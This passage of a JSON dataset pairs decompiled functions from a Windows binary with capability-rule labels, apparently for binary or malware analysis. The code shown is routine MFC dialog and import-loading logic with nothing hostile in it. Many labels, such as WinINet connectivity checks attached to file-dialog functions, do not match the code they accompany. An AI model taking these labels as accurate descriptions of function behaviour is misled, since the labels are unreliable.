        "decompiled_code": "\nuint __cdecl fcn.00422c0d(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t arg_8h_00;\n    int32_t *lpArguments;\n    char *pcVar6;\n    bool bVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x8007007e;\n    if (*(*0x40003c + 0x4000e4) != 0) {\n        for (arg_8h_00 = *(*0x40003c + 0x4000e0) + 0x400000; iVar2 = *(arg_8h_00 + 4),  iVar2 != 0;\n            arg_8h_00 = arg_8h_00 + 0x20) {\n            pcVar4 = iVar2 + 0x400000;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = pcVar4 - (iVar2 + 0x400001);\n            pcVar4 = arg_8h;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            if (iVar5 == pcVar4 - (arg_8h + 1)) {\n                bVar7 = true;\n                pcVar4 = arg_8h;\n                pcVar6 = iVar2 + 0x400000;\n                do {\n                    if (iVar5 == 0) break;\n                    iVar5 = iVar5 + -1;\n                    bVar7 = *pcVar4 == *pcVar6;\n                    pcVar4 = pcVar4 + 1;\n                    pcVar6 = pcVar6 + 1;\n                } while (bVar7);\n                if (bVar7) break;\n            }\n        }\n        if (*(arg_8h_00 + 4) != 0) {\n            lpArguments = *(arg_8h_00 + 0xc) + 0x400000;\n            iVar5 = 0;\n            iVar2 = *lpArguments;\n            piVar3 = lpArguments;\n            while (iVar2 != 0) {\n                piVar3 = piVar3 + 1;\n                iVar5 = iVar5 + 1;\n                iVar2 = *piVar3;\n            }\n            piVar3 = lpArguments + iVar5;\n            for (; lpArguments < piVar3; lpArguments = lpArguments + 1) {\n                fcn.004229ae(arg_8h_00, lpArguments);\n            }\n            var_4h = 0;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 641
    },
    "00422cbd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00422cbd(char *arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    char *pcVar9;\n    int32_t *piVar10;\n    bool bVar11;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_8h = 0;\n    var_4h = *0x467588;\n    if (*0x467588 != NULL) {\n        do {\n            pcVar9 = *(var_4h[1] + 4) + 0x400000;\n            pcVar3 = pcVar9;\n            do {\n                cVar1 = *pcVar3;\n                pcVar3 = pcVar3 + 1;\n            } while (cVar1 != '\\0');\n            iVar4 = pcVar3 - (*(var_4h[1] + 4) + 0x400001);\n            pcVar3 = arg_8h;\n            do {\n                cVar1 = *pcVar3;\n                pcVar3 = pcVar3 + 1;\n            } while (cVar1 != '\\0');\n            if (iVar4 == pcVar3 - (arg_8h + 1)) {\n                bVar11 = true;\n                pcVar3 = arg_8h;\n                do {\n                    if (iVar4 == 0) break;\n                    iVar4 = iVar4 + -1;\n                    bVar11 = *pcVar3 == *pcVar9;\n                    pcVar3 = pcVar3 + 1;\n                    pcVar9 = pcVar9 + 1;\n                } while (bVar11);\n                if (bVar11) break;\n            }\n            var_4h = *var_4h;\n        } while (var_4h != NULL);\n        if ((var_4h != NULL) && (iVar4 = var_4h[1],  *(iVar4 + 0x18) != 0)) {\n            puVar7 = *(iVar4 + 8) + 0x400000;\n            uVar2 = *puVar7;\n            piVar10 = *(iVar4 + 0xc) + 0x400000;\n            piVar8 = *(iVar4 + 0x18) + 0x400000;\n            iVar5 = 0;\n            iVar4 = *piVar10;\n            piVar6 = piVar10;\n            while (iVar4 != 0) {\n                piVar6 = piVar6 + 1;\n                iVar5 = iVar5 + 1;\n                iVar4 = *piVar6;\n            }\n            for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *piVar10 = *piVar8;\n                piVar8 = piVar8 + 1;\n                piVar10 = piVar10 + 1;\n            }\n            (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar2);\n            *puVar7 = 0;\n            fcn.004228e0();\n            (*_sym.imp.KERNEL32.dll_LocalFree)(var_4h);\n            var_8h = 1;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 743
    },
    "00422e83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00422e83(int32_t param_1)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(*(param_1 + 0x70) + 0x1c));\n    bVar1 = false;\n    fcn.00411850(*(*(param_1 + 0x70) + 0x1c) + iVar3 + 1, 0, *(*(param_1 + 0x70) + 0x20) - (iVar3 + 1));\n    (*_sym.imp.USER32.dll_GetFocus)();\n    iVar3 = *(param_1 + 0x70);\n    uVar4 = fcn.00428705();\n    *(iVar3 + 4) = uVar4;\n    fcn.0042b4da();\n    pcVar2 = _sym.imp.USER32.dll_EnableWindow;\n    if (*(*(param_1 + 0x70) + 4) != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(*(param_1 + 0x70) + 4));\n        if (iVar3 != 0) {\n            bVar1 = true;\n            (*pcVar2)(*(*(param_1 + 0x70) + 4), 0);\n        }\n    }\n    iVar3 = fcn.00444bc2();\n    if ((*(*(param_1 + 0x70) + 0x36) & 8) == 0) {\n        fcn.0042cef4(param_1);\n    }\n    else {\n        *(iVar3 + 0x18) = param_1;\n    }\n    if (*(param_1 + 0x74) == 0) {\n        (*_sym.imp.comdlg32.dll_GetSaveFileNameA)(*(param_1 + 0x70));\n    }\n    else {\n        (*_sym.imp.comdlg32.dll_GetOpenFileNameA)();\n    }\n    *(iVar3 + 0x18) = 0;\n    if (bVar1) {\n        (*pcVar2)(*(*(param_1 + 0x70) + 4), 1);\n    }\n    iVar3 = (*_sym.imp.USER32.dll_IsWindow)(unaff_EBP);\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SetFocus)(unaff_ESI);\n    }\n    fcn.0042873f();\n    if (unaff_EBP == 0) {\n        unaff_EBP = 2;\n    }\n    return unaff_EBP;\n}\n",
        "token_count": 603
    },
    "004231dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: lpVersionInformation\n\nvoid __cdecl\nfcn.004231dc(uint arg_8h, uint arg_ch, uint lpString2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    code **ppcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_a8h;\n    uint lpVersionInformation;\n    uint var_a0h;\n    uint var_94h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = *0x4640c8;\n    *(unaff_EBP + -0xa8) = extraout_ECX;\n    fcn.004284fa(0, *(unaff_EBP + 0x1c));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CFileDialog.0;\n    fcn.00402490();\n    *(unaff_EBP + -4) = 1;\n    if (*(unaff_EBP + 0x20) == 0) {\n        fcn.00411850(unaff_EBP + -0xa4, 0, 0x94);\n        *(unaff_EBP + -0xa4) = 0x94;\n        (*_sym.imp.KERNEL32.dll_GetVersionExA)(unaff_EBP + -0xa4);\n        if ((*(unaff_EBP + -0x94) != 2) || (*(unaff_EBP + 0x20) = 0x58,  *(unaff_EBP + -0xa0) < 5)) {\n            *(unaff_EBP + 0x20) = 0x4c;\n        }\n    }\n    pcVar5 = fcn.0041101f(*(unaff_EBP + 0x20));\n    extraout_ECX[0x1c] = pcVar5;\n    if (pcVar5 == NULL) {\n        pcVar5 = fcn.00422e2d();\n    }\n    fcn.00411850(pcVar5, 0, *(unaff_EBP + 0x20));\n    pcVar5 = *(unaff_EBP + 8);\n    uVar2 = *(unaff_EBP + 0x20);\n    extraout_ECX[0x1d] = pcVar5;\n    extraout_ECX[0x14] = 0x7005 - (pcVar5 != NULL);\n    extraout_ECX[0x70] = NULL;\n    *(extraout_ECX + 0x1f) = 0;\n    ppcVar1 = extraout_ECX + 0x2f;\n    *ppcVar1 = 0;\n    *extraout_ECX[0x1c] = uVar2;\n    uVar2 = *(unaff_EBP + 0xc);\n    *(extraout_ECX[0x1c] + 0x1c) = ppcVar1;\n    *(extraout_ECX[0x1c] + 0x20) = 0x104;\n    *(extraout_ECX[0x1c] + 0x3c) = uVar2;\n    uVar3 = *(unaff_EBP + 0x14);\n    *(extraout_ECX[0x1c] + 0x24) = extraout_ECX + 0x1f;\n    *(extraout_ECX[0x1c] + 0x28) = 0x40;\n    *(extraout_ECX[0x1c] + 0x34) = *(extraout_ECX[0x1c] + 0x34) | uVar3 | 0x80020;\n    if ((*(unaff_EBP + 0x14) & 0x40) != 0) {\n        extraout_ECX[0x1c][0x36] = extraout_ECX[0x1c][0x36] & 0x7f;\n    }\n    iVar6 = fcn.00444bf8();\n    iVar4 = *(unaff_EBP + 0x10);\n    *(extraout_ECX[0x1c] + 8) = *(iVar6 + 0xc);\n    *(extraout_ECX[0x1c] + 0x44) = fcn.004238ea;\n    if (iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(ppcVar1, *(unaff_EBP + 0x10), 0x104);\n    }\n    if (*(unaff_EBP + 0x18) != 0) {\n        fcn.00401c20(*(unaff_EBP + 0x18));\n        puVar7 = fcn.004019c0(0);\n        while( true ) {\n            puVar7 = fcn.00411e20(puVar7, 0x7c);\n            if (puVar7 == NULL) break;\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *(extraout_ECX[0x1c] + 0xc) = extraout_ECX[0x1e];\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1302
    },
    "0042337c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0042337c(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    uVar1 = *(*(extraout_ECX + 0x70) + 0x36);\n    *(unaff_EBP + -0x14) = 0;\n    if (((uVar1 & 8) != 0) && (*(extraout_ECX + 0x1c) != 0)) {\n        piVar3 = fcn.004290ee();\n        iVar4 = (**(*piVar3 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar4 + 0x10;\n        pcVar2 = _sym.imp.USER32.dll_GetParent;\n        uVar6 = *(extraout_ECX + 0x1c);\n        *(unaff_EBP + -4) = 0;\n        uVar5 = (*pcVar2)(uVar6);\n        uVar5 = fcn.0042b432(uVar5);\n        *(unaff_EBP + -0x14) = uVar5;\n        uVar5 = fcn.004019c0(0x104);\n        iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(*(*(unaff_EBP + -0x14) + 0x1c), 0x464, 0x104, uVar5);\n        if (iVar4 < 0) {\n            fcn.00401810();\n        }\n        else {\n            fcn.004059a0(uVar6, 0xffffffff);\n        }\n        if (*(*(unaff_EBP + -0x10) + -0xc) != 0) {\n            uVar6 = (*pcVar2)(*(extraout_ECX + 0x1c));\n            iVar4 = fcn.0042b432(uVar6);\n            uVar6 = fcn.004019c0(0x104);\n            iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(*(iVar4 + 0x1c), 0x465, 0x104, uVar6);\n            if (-1 < iVar4) {\n                fcn.004059a0(0xffffffff);\n                fcn.004019a0(unaff_EBP + -0x10);\n                fcn.00401200();\n                goto code_r0x0042345f;\n            }\n            fcn.00401810();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00401200();\n    }\n    fcn.00401ce0(*(*(extraout_ECX + 0x70) + 0x1c));\ncode_r0x0042345f:\n    uVar6 = *(unaff_EBP + 8);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar6;\n}\n",
        "token_count": 769
    },
    "00423c55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423c55(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    if (arg_8h == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(arg_8h);\n    uVar2 = fcn.0042b459(uVar2);\n    piVar3 = fcn.0042ffac(0x4559b0, uVar2);\n    if (piVar3 != NULL) {\n        if (arg_ch == 0x400) {\n            uVar2 = (**(*piVar3 + 0x158))(arg_10h, arg_10h >> 0x10, arg_14h);\n            return uVar2;\n        }\n        if ((0x400 < arg_ch) && (arg_ch < 0x407)) {\n            iVar1 = *piVar3;\n            uVar2 = fcn.0043374e(arg_10h, arg_ch, arg_14h);\n            uVar2 = (**(iVar1 + 0x15c))(uVar2);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 299
    },
    "00423d5f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00423d5f(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (param_1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        iVar4 = param_1;\n        puVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(param_1);\n        if (param_1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*pcVar1)(param_1);\n        }\n        if (puVar3 == NULL) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.GDI32.dll_CreateDCA)(*puVar3 + puVar3, puVar3[1] + puVar3, puVar3[2] + puVar3, uVar2);\n            pcVar1 = _sym.imp.KERNEL32.dll_GlobalUnlock;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n            if (param_1 != 0) {\n                (*pcVar1)(param_1);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 293
    },
    "00423e55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00423e55(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004284fa(0, *(unaff_EBP + 0x10));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CPrintDialog.0;\n    extraout_ECX[0x1c] = extraout_ECX + 0x1d;\n    fcn.00411850(extraout_ECX + 0x1d, 0, 0x42);\n    *extraout_ECX[0x1c] = 0x42;\n    *(extraout_ECX[0x1c] + 0x14) = *(unaff_EBP + 0xc) | 0x3000;\n    iVar3 = fcn.0042882c();\n    if (iVar3 != 0) {\n        extraout_ECX[0x1c][0x15] = extraout_ECX[0x1c][0x15] | 8;\n    }\n    iVar3 = *(unaff_EBP + 8);\n    *(extraout_ECX[0x1c] + 0x2a) = fcn.004238ea;\n    *(extraout_ECX[0x1c] + 0x2e) = fcn.004238ea;\n    if (iVar3 == 0) {\n        extraout_ECX[0x14] = 0x7008;\n        pcVar2 = extraout_ECX[0x1c] + 0x15;\n        *pcVar2 = *pcVar2 | 1;\n    }\n    else {\n        extraout_ECX[0x14] = 0x7009;\n        puVar1 = extraout_ECX[0x1c] + 0x14;\n        *puVar1 = *puVar1 | 0x40;\n    }\n    extraout_ECX[0x1c][0x15] = extraout_ECX[0x1c][0x15] & 0xfd;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 629
    },
    "004244a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004244a7(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    uint var_ch;\n    \n    fcn.004243d2(&var_30h, arg_8h, arg_14h);\n    if (arg_10h != 0) {\n        fcn.00411970(&var_20h, arg_10h, 0x10);\n    }\n    var_ch = arg_ch;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x404, 0, &var_30h);\n    return;\n}\n",
        "token_count": 173
    },
    "004244f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004244f5(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    uint var_10h;\n    uint32_t var_ch;\n    \n    fcn.004243d2(&var_30h, arg_8h, arg_14h);\n    if (arg_10h != 0) {\n        fcn.00411970(&var_20h, arg_10h, 0x10);\n    }\n    iVar1 = fcn.00444bf8();\n    var_10h = *(iVar1 + 0xc);\n    var_ch = arg_ch & 0xffff;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x404, 0, &var_30h);\n    return;\n}\n",
        "token_count": 221
    },
    "00424a78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424a78(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    \n    iVar1 = fcn.00444c1e();\n    iVar2 = *(iVar1 + 0x3c);\n    if (arg_8h == 0) {\n        if ((*(in_ECX + 0x38) & arg_ch) != 0) {\n            if (*(iVar1 + 0x40) == in_ECX) {\n                fcn.0042a6c6(1);\n            }\n            if ((iVar2 != 0) && (*(iVar2 + 0x1c) != 0)) {\n                fcn.00411850(&var_30h, 0, 0x30);\n                var_28h = *(in_ECX + 0x1c);\n                var_30h = 0x28;\n                var_2ch = 1;\n                var_24h = var_28h;\n                (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x1c), 0x405, 0, &var_30h);\n            }\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) & ~arg_ch;\n        }\n    }\n    else if ((*(in_ECX + 0x38) & arg_ch) == 0) {\n        iVar2 = fcn.00444bf8();\n        *(iVar2 + 0x1034) = 0x424a1d;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) | arg_ch;\n    }\n    return 1;\n}\n",
        "token_count": 422
    },
    "0043ed29": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0043ed29(uint32_t arg_8h, uint32_t wParam, int32_t lParam, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h == 0x2b) {\n        var_4h = lParam;\n        var_8h = 0x43edae;\n        (**(*in_ECX + 0x134))();\n        return 1;\n    }\n    if (arg_8h == 0x2c) {\n        var_4h = lParam;\n        var_8h = 0x43eda1;\n        (**(*in_ECX + 0x138))();\n        return 1;\n    }\n    if (arg_8h == 0x2d) {\n        var_4h = lParam;\n        var_8h = 0x43ed94;\n        (**(*in_ECX + 0x140))();\n        return 1;\n    }\n    if (arg_8h == 0x2e) {\n        var_4h = wParam >> 0x10;\n        var_8h = wParam & 0xffff;\n        var_ch = 0x43ed87;\n        iVar1 = (**(*in_ECX + 0x144))();\n    }\n    else if (arg_8h == 0x2f) {\n        var_4h = wParam >> 0x10;\n        var_8h = wParam & 0xffff;\n        var_ch = 0x43ed6c;\n        iVar1 = (**(*in_ECX + 0x148))();\n    }\n    else {\n        if (arg_8h != 0x39) {\n            if (in_ECX[0x13] != 0) {\n                var_8h = lParam;\n                var_ch = wParam;\n                iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[7], arg_8h + 0x2000);\n                if (((arg_8h < 0x132) || (0x138 < arg_8h)) || (iVar1 != 0)) {\n                    if (arg_14h != NULL) {\n                        *arg_14h = iVar1;\n                    }\n                    iVar1 = 1;\n                }\n                return iVar1;\n            }\n            if (arg_8h < 0x112) {\n                if (arg_8h == 0x111) {\n                    iVar1 = fcn.0042e6b6(0, wParam >> 0x10 | 0xbd110000, 0, 0);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    if (arg_14h != NULL) {\n                        *arg_14h = 1;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (0x2a < arg_8h) {\n                    if ((arg_8h < 0x30) || (arg_8h == 0x39)) goto code_r0x0042d718;\n                    if (arg_8h == 0x4e) {\n                        var_8h = arg_14h;\n                        var_4h = lParam;\n                        iVar1 = fcn.0042e6b6(0, *(lParam + 8) & 0xffff | 0xbc4e0000, &fcn.0043ed29::var_8h, 0);\n                        return iVar1;\n                    }\n                }\n            }\n            else if ((0x113 < arg_8h) && ((arg_8h < 0x116 || (arg_8h == 0x210)))) {\ncode_r0x0042d718:\n                iVar1 = fcn.0042d079(arg_8h + 0xbc00, wParam, lParam, arg_14h);\n                return iVar1;\n            }\n            if ((0x131 < arg_8h) && (arg_8h < 0x139)) {\n                var_4h = arg_8h - 0x132;\n                var_8h = wParam;\n                iVar1 = fcn.0042d079(0xbc19, 0, &fcn.0043ed29::var_ch, arg_14h);\n                if (*arg_14h != 0) {\n                    return iVar1;\n                }\n            }\n            return 0;\n        }\n        var_4h = lParam;\n        var_8h = 0x43ed56;\n        iVar1 = (**(*in_ECX + 0x13c))();\n    }\n    *arg_14h = iVar1;\n    return 1;\n}\n",
        "token_count": 1071
    },
    "004260f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004260f9(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar1 = fcn.00444c1e();\n    if ((*(iVar1 + 0x24) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042eaa9(0x434cb4);\n        iVar3 = fcn.0042eabb(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004307be(0x452b84, 0x447c1c, 0x447bf4, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x24) = uVar4;\n        fcn.0042eaa9(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x24);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 366
    },
    "00430847": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
